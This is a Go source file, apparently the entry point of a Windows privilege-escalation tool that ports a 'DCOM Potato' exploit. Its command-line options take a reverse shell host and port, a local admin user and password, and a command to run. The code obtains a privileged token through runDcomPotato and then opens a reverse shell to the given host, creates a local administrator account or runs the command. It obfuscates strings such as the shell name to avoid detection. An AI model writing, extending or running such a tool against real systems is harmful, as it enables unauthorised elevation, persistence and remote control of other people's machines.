//go:build windows

package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
)

func printUsage() {
	fmt.Fprintf(os.Stderr, `Usage: %s [options]

  -c, --cmd=CMD       Command / shell
  -p, --pipe=NAME     Pipe name (default Crystal)
  -H, --lhost=HOST    Reverse shell host
  -P, --lport=PORT    Reverse shell port
  -u, --user=USER     Local admin user
  -pw PASS            Password for -u (separate flag, same as Crystal)
  -d                  Debug (level 1)
  -dd                 Verbose debug (level 2)
  -h, --help          Show this help

`, os.Args[0])
}

// Crystal parses -dd and -pw before OptionParser.
func preprocessArgv(argv []string) (filtered []string, pw string) {
	filtered = append(filtered, argv[0])
	for i := 1; i < len(argv); i++ {
		a := argv[i]
		if a == "-dd" {
			dcomDebugLevel = 2
			continue
		}
		if a == "-pw" {
			if i+1 < len(argv) {
				pw = argv[i+1]
				i++
			}
			continue
		}
		filtered = append(filtered, a)
	}
	return filtered, pw
}

func main() {
	argv, pwFromArgv := preprocessArgv(os.Args)
	os.Args = argv

	var (
		command  string
		pipeName string
		lhost    string
		lport    uint
		username string
		password string
		showHelp bool
	)

	flag.Usage = printUsage
	flag.StringVar(&command, "c", "", "Command / shell")
	flag.StringVar(&command, "cmd", "", "Command / shell")
	flag.StringVar(&pipeName, "p", "Crystal", "Pipe name")
	flag.StringVar(&pipeName, "pipe", "Crystal", "Pipe name")
	flag.StringVar(&lhost, "H", "", "Reverse shell host")
	flag.StringVar(&lhost, "lhost", "", "Reverse shell host")
	flag.UintVar(&lport, "P", 0, "Reverse shell port")
	flag.UintVar(&lport, "lport", 0, "Reverse shell port")
	flag.StringVar(&username, "u", "", "Local admin user")
	flag.StringVar(&username, "user", "", "Local admin user")
	flag.StringVar(&password, "pw", "", "Password for -u (use -pw PASS for Crystal-style)")
	flag.BoolVar(&showHelp, "h", false, "Help")
	flag.BoolVar(&showHelp, "help", false, "Help")
	dbg := flag.Bool("d", false, "Debug")
	flag.Parse()

	if *dbg && dcomDebugLevel < 1 {
		dcomDebugLevel = 1
	}
	if pwFromArgv != "" {
		password = pwFromArgv
	}

	if showHelp {
		printUsage()
		os.Exit(0)
	}

	hasRev := strings.TrimSpace(lhost) != "" && lport > 0
	hasUser := strings.TrimSpace(username) != "" && strings.TrimSpace(password) != ""
	hasCmd := strings.TrimSpace(command) != ""
	if !hasRev && !hasUser && !hasCmd {
		fmt.Fprintln(os.Stderr, deobfDcom(obfErrNeedAct))
		os.Exit(1)
	}

	tok, err := runDcomPotato(pipeName)
	if err != nil {
		if dcomDebug() {
			fmt.Fprintln(os.Stderr, err.Error())
		} else {
			fmt.Fprintln(os.Stderr, "[!] failed")
		}
		os.Exit(1)
	}
	defer tok.Close()

	if hasRev {
		shell := command
		if strings.TrimSpace(shell) == "" {
			shell = deobfDcom(obfCmdExe)
		}
		if err := runReverseShell(tok, lhost, uint16(lport), shell); err != nil {
			if dcomDebug() {
				fmt.Fprintln(os.Stderr, err.Error())
			}
			os.Exit(1)
		}
		return
	}
	if hasUser {
		if err := addLocalAdmin(tok, username, password); err != nil {
			if dcomDebug() {
				fmt.Fprintln(os.Stderr, err.Error())
			}
			os.Exit(1)
		}
		return
	}
	runCommandCapture(tok, command)
}
